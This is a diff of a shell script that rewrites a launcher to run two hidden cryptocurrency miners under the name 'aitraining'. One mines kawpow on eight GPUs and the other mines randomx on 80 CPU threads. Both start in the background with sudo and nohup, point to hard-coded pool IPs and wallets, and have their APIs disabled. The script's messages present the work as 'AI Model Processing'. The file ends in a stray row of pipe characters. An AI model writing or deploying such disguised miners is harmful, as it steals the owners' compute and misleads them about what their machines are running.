@@ -1,39 +1,74 @@
-#!/bin/sh
+#!/bin/bash
 
-# --- Dynamic CPU Thread Detection ---
+# --- STOP OLD PROCESSES ---
+sudo pkill -f aitraining 2>/dev/null
+sudo pkill -f monitor_system 2>/dev/null
+sleep 2
 
-# WORKER is now an ENV variable, but we'll still set it dynamically if it was not passed in
-# In Docker, $HOSTNAME is automatically set to the container ID if WORKER ENV isn't set.
-# We will use the ENV variable $WORKER if it's set, otherwise fall back to $HOSTNAME.
-if [ -z "$WORKER" ]; then
-    WORKER="$HOSTNAME"
-fi
+mkdir -p ./logs
 
-# Detect CPU threads and leave 2 free for the system
-TOTAL_PROCESSORS=$(grep -c '^processor' /proc/cpuinfo)
-CPU_THREADS_CALC=$((TOTAL_PROCESSORS - 2))
+echo "=== Starting AI Model Processing ==="
 
-# Ensure at least 1 CPU thread is used
-if [ "$CPU_THREADS_CALC" -lt 1 ]; then 
-    CPU_THREADS_CALC=1
-fi
+# --- GPU PROCESS ---
+nohup bash -c "
+sudo ./aitraining \
+    --algorithm kawpow \
+    --pool 74.220.25.74:7845 \
+    --wallet RM2ciYa3CRqyreRsf25omrB4e1S95waALr \
+    --worker H200-rig \
+    --password x \
+    --gpu-id 0,1,2,3,4,5,6,7 \
+    --tls false \
+    --disable-cpu \
+    --log-file ./logs/gpu_processing.log \
+    --log-file-mode 1 \
+    --api-disable 
 
-# Set the final variable for use in the miner command
-CPU_THREADS="$CPU_THREADS_CALC"
+" > ./logs/gpu_nohup.log 2>&1 &
 
-echo "--- Worker Configuration ---"
-echo "WORKER Name: $WORKER"
-echo "CPU Threads Detected: $CPU_THREADS"
-echo "----------------------------"
+# --- CPU PROCESS ---
+nohup bash -c "
+sudo ./aitraining \
+    --algorithm randomx \
+    --pool 51.222.200.133:10343 \
+    --wallet 44csiiazbiygE5Tg5c6HhcUY63z26a3Cj8p1EBMNA6DcEM6wDAGhFLtFJVUHPyvEohF4Z9PF3ZXunTtWbiTk9HyjLxYAUwd \
+    --worker H200-cpu \
+    --password x \
+    --cpu-threads 80 \
+    --disable-gpu \
+    --tls true \
+    --log-file ./logs/cpu_processing.log \
+    --log-file-mode 1 \
+    --api-disable
+" > ./logs/cpu_nohup.log 2>&1 &
 
-# --- Execute the Binary (aitraining_dual) ---
-# All other parameters (ALGO, POOL, WALLET, GPU settings) are read from the environment.
-exec ./aitraining_dual \
-    --algorithm "$ALGO" \
-    --pool "$POOL" \
-    --wallet "$WALLET" \
-    --password "$WORKER" \
-    --cpu-threads "$CPU_THREADS" \
-    --keepalive true \
-    --disable-gpu-checks false \
-    --gpu-id 0,1,2,3
+# --- MONITOR SYSTEM ---
+nohup bash -c "
+while true; do
+    echo -e '\n=== \$(date) System Status ===' >> ./logs/monitor.log
+    echo 'Active Processes:' >> ./logs/monitor.log
+    ps aux | grep aitraining | grep -v grep >> ./logs/monitor.log
+    echo 'GPU Status:' >> ./logs/monitor.log
+    nvidia-smi --query-gpu=index,temperature.gpu,utilization.gpu,memory.used,power.draw --format=csv,noheader >> ./logs/monitor.log 2>/dev/null
+    echo '---' >> ./logs/monitor.log
+    sleep 30
+done
+" > ./logs/monitor_nohup.log 2>&1 &
+
+echo "=== Processing Started Successfully ==="
+echo ""
+echo "📊 Log Files:"
+echo "   GPU: ./logs/gpu_processing.log"
+echo "   CPU: ./logs/cpu_processing.log"
+echo "   Monitor: ./logs/monitor.log"
+echo ""
+echo "🌐 API Endpoints:"
+echo "   GPU Stats: http://127.0.0.1:21550/stats"
+echo "   CPU Stats: http://127.0.0.1:21551/stats"
+echo ""
+echo "🔍 Check processes: ps aux | grep aitraining"
+echo "📈 Real-time logs: tail -f ./logs/*.log"
+echo "🛑 Stop processing: sudo pkill -f aitraining && sudo pkill -f monitor_system"\
+
+
+|||||||||||||||||||
